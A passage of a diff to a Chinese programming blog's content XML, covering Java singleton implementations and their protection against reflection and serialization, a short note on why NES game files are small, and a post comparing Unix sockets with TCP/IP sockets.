-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
-<p>以上述 LazySingleton 为例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
-<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
-<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
-<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
-<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
-<p>注册式单例可以避免这个问题</p>
-<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
-<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
-<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
-<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
-<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>源码</tag>
-        <tag>设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>红白机游戏文件如何做到这么小</title>
     <url>/why-NES-file-so-small.html</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p>汇编语言编写</p>
+<p>美术和音乐资源都实现了复用，多次压缩，实时渲染</p>
+<p>保存了音频文件相关的数据序列，随着游戏的运行，实时演奏的。</p>
+<p>玩家在玩游戏的时候，卷轴经过的地方在<a href="https://www.zhihu.com/search?q=%E6%98%BE%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:185449257%7D">显存</a>中被绘制，经过以后，前边的地方在显存中就释放掉了</p>
+<p>超级马里奥中的砖块，云朵，小怪都只是占用了一份内存。更离谱的是，只保存了物体的一半，比如蘑菇，只保存蘑菇的一半数据，渲染的时候做了镜像处理。</p>
+]]></content>
       <categories>
         <category>问答</category>
       </categories>
       <tags>
         <tag>红白机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unix socket 与 TCP/IP socket 的区别</title>
+    <url>/unix-socket-and-tcp-ip-socket.html</url>
+    <content><![CDATA[<h2 id="Unix-socket"><a href="#Unix-socket" class="headerlink" title="Unix socket"></a>Unix socket</h2><p>又叫 IPC（inter-process communication 进程间通信） socket，用于实现同一主机上的进程间通信。通过监听 path（Unix 文件系统路径） 而不是 port。直接将应用层数据从一个进程拷贝到另一个进程，不需要经过网络层（检查、路由等），因此比 IP socket 效率更高。</p>
+<p>MySQL 对此特性的优化，如果发现地址是 localhost，就会使用 unix 套接字来提升性能。具体参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/connecting.html">https://dev.mysql.com/doc/refman/8.0/en/connecting.html</a></p>
+<p>通过以下命令来列出本机 Unix socket</p>
+<p>Linux: <code>netstat -a -p --unix</code></p>
+<p>Mac: <code>netstat -a -f unix</code></p>
+<p>Windows: 没有 Unix socket，有个类似的机制叫做 <strong>Named pipes</strong>。win10 支持 Unix socket，有一些限制，具体参考：<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/</a></p>
+<h2 id="TCP-IP-socket"><a href="#TCP-IP-socket" class="headerlink" title="TCP/IP socket"></a>TCP/IP socket</h2><p>进程间网络通信机制，也可以实现同一主机进程通信（通过使用环回接口）。一个 IP socket connection 由 &lt;local IP, local port, remote IP and remote port&gt; 唯一标识。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets">https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets</a></p>
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+      <tags>
+        <tag>socket</tag>
+        <tag>tcp</tag>
       </tags>
   </entry>
   <entry>
